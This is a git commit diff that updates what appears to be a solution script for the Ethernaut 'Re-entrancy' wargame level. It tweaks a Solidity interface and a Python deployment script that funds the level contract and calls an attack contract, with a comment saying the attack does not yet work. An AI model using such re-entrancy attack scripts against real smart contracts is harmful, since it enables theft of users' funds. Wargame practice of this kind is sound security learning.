b6eb6b2461a1ad81ccd6e9314d0907eb412c93db
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-23 14:24:15 +0100

    update 10-deploy_attack.py

--- interfaces/ire-entrancy.sol
+++ interfaces/ire-entrancy.sol
@@ -4,7 +4,7 @@ pragma solidity ^0.6.12;
 interface ReentrantInterface {
     function donate(address _to) external payable;
 
-    function withdraw(uint _amount) external view;
+    function withdraw(uint _amount) external;
 
     function balanceOf(address _who) external view returns (uint balance);
 }
--- scripts/10-deploy_attack.py
+++ scripts/10-deploy_attack.py
@@ -17,14 +17,20 @@ def main():
     # deploy attack contract
     attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})
     eth_balance_attack = web3.fromWei(attack.balance(), "ether")
-    print(f"\nBalance of the attack contract = {eth_balance_attack} ether")
+    print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")
 
-    """donate ether to the target contract"""
-    target.donate(attack, {"from": player, "value": AMOUNT})
-    print(f"\nBalance of the target contract = {eth_balance_target} ether\n")
+    """donate ether to the target (which points at the Level contract) contract"""
+    target.donate(ETHERNAUT_INSTANCE, {"from": player, "value": AMOUNT})
+
+    balance_ETHERNAUT_INSTANCE = web3.eth.get_balance(ETHERNAUT_INSTANCE)
+    balance_ETHERNAUT_INSTANCE_ether = web3.fromWei(balance_ETHERNAUT_INSTANCE, "ether")
+    print(f"\nBalance of Ethernaut level = {balance_ETHERNAUT_INSTANCE_ether} ETH\n")
 
     """call the attack() function, on my attack contract"""
-    # print(f"Calling attack() from {attack} ")
+    print(f"\nCalling attack() from {attack}\n")
+
+    # PROBLEM HERE - attack doesn't work!!!!!!!!!!!!!!!!!!!!!!!!!!!   <------  LOOK
+    attack.attack({"from": player})
     # attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})
 
-    # print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")
+    print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")
